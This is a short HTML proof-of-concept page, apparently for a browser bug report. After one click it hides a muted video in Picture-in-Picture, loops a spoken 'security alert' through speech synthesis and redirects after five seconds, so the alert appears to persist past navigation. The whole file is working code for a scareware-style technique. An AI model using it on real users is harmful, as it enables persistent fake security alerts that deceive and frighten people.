<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PiP + SpeechSynthesis + Redirect PoC</title>
</head>
<body>

<h2>CLICK TO START</h2>
<button id="startBtn">Start</button>

<!-- Video PiP muted -->
<video id="v" src="windows.mp4" loop muted style="width:0; height:0;"></video>

<script>
const btn = document.getElementById('startBtn');
const video = document.getElementById('v');
let speaking = false;

btn.addEventListener('click', async () => {
  btn.disabled = true;

  // 🎬 Play video muted
  try { await video.play(); } catch(e){ console.warn("Video play failed", e); }

  // 🖼️ Request PiP (muted)
  try {
    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
      await video.requestPictureInPicture();
    }
  } catch(e){ console.warn("PiP failed", e); }

  // 🔊 SpeechSynthesis loop
  const text = "This is a security alert message from video.";
  function speakLoop() {
    if (speaking) return;
    speaking = true;

    const utter = new SpeechSynthesisUtterance(text);
    utter.lang = 'en-US';

    const voices = speechSynthesis.getVoices();
    if (voices.length) {
      const enVoice = voices.find(v => v.lang.startsWith('en'));
      if (enVoice) utter.voice = enVoice;
    }

    speechSynthesis.speak(utter);
    utter.onend = () => {
      speaking = false;
      speakLoop(); // loop persistent
    };
  }

  speakLoop();

  // 🔀 Redirect setelah delay (user sempat dengar audio)
  setTimeout(() => {
    window.location.href = "https://www.google.com";
  }, 5000); // delay 5 detik
});
</script>

</body>
</html>
